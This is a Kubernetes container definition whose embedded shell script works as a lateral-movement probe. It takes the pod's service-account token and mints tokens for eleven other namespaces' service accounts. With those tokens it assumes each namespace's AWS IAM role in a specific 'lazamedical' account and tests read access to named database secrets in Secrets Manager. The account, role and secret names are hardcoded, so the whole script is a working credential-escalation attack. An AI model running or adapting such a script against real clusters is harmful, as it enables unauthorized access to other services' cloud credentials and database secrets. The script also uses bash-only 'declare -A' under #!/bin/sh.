containers.name: probe
args:
#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token); API=https://kubernetes.default.svc
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
echo "===I3560D_START utc=$(date -u +%FT%TZ)==="
apk add --no-cache aws-cli jq >/tmp/apk.log 2>&1
export AWS_DEFAULT_REGION=us-west-2
declare -A ROLES
ROLES[audit-log]=lazamedical-dev01-usw2-sa-audit-log-role
ROLES[authorization-service]=lazamedical-dev01-usw2-sa-authorization-service-role
ROLES[cognito-service]=lazamedical-dev01-usw2-sa-cognito-service-role
ROLES[data-management]=lazamedical-dev01-usw2-sa-data-management-service-role
ROLES[de-identifier-service]=lazamedical-dev01-usw2-sa-de-identifier-role
ROLES[imfusion-service]=lazamedical-dev01-usw2-sa-imfusion-service-role
ROLES[mlflow]=lazamedical-dev01-usw2-sa-mlflow-service-role
ROLES[notification-service]=lazamedical-dev01-usw2-sa-notification-service-role
ROLES[s3-ingestion]=lazamedical-dev01-usw2-sa-s3-ingestion-service-role
ROLES[user-management-service]=lazamedical-dev01-usw2-sa-user-management-service-role
ROLES[metadata-extraction-service]=lazamedical-dev01-usw2-sa-metadata-extraction-service-role
ROLES[aws-lb-controller]=lazamedical-dev01-usw2-AWSLoadBalancerControllerRole
ROLES[cluster-autoscaler]=lazamedical-dev01-usw2_eks-cluster-autoscaler
ROLES[ebs-csi]=lazamedical-dev01-usw2-AmazonEBSCSIDriverRole
echo "###PHASE_MATRIX"
for NS in audit-log authorization-service cognito-service data-management de-identifier-service imfusion-service mlflow notification-service s3-ingestion user-management-service metadata-extraction-service; do
  KT=$(wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" --post-data='{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"audiences":["sts.amazonaws.com"],"expirationSeconds":1800}}' --header="Content-Type: application/json" "$API/api/v1/namespaces/$NS/serviceaccounts/${NS}-sa/token" 2>/dev/null)
  WT=$(echo "$KT" | jq -r '.status.token // empty')
  [ -z "$WT" ] && { echo "TOKFAIL $NS"; continue; }
  RARN="arn:aws:iam::025066249002:role/${ROLES[$NS]}"
  RES=$(aws sts assume-role-with-web-identity --role-arn "$RARN" --role-session-name i3560d --web-identity-token "$WT" --duration-seconds 1200 --region us-west-2 --output json 2>&1)
  if ! echo "$RES" | jq -e '.Credentials' >/dev/null 2>&1; then echo "ASMFAIL $NS $(echo "$RES" | grep -oE 'AccessDenied|Validation|NoSuchEntity|InvalidIdentityToken' | head -1)"; continue; fi
  export AWS_ACCESS_KEY_ID=$(echo "$RES" | jq -r .Credentials.AccessKeyId)
  export AWS_SECRET_ACCESS_KEY=$(echo "$RES" | jq -r .Credentials.SecretAccessKey)
  export AWS_SESSION_TOKEN=$(echo "$RES" | jq -r .Credentials.SessionToken)
  for SN in lazamedical-dev01-usw2-mysql-1-db-secret lazamedical-dp-dev01-usw2-postgresql-db-secret lazamedical-dp-dev01-usw2-postgresql-db1-secret lazamedical-dev01-usw2-postgresql2-db2-secret2; do
    RR=$(aws secretsmanager get-secret-value --secret-id "$SN" --region us-west-2 --query 'ARN' --output text 2>&1)
    if echo "$RR" | grep -q '^arn:aws:secretsmanager'; then echo "GSV_OK $NS $SN"; else echo "GSV_DENY $NS $SN $(echo "$RR" | grep -oE 'AccessDeniedException|ResourceNotFoundException|ValidationException' | head -1)"; fi
  done
  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
done
echo "===I3560D_DONE utc=$(date -u +%FT%TZ)==="
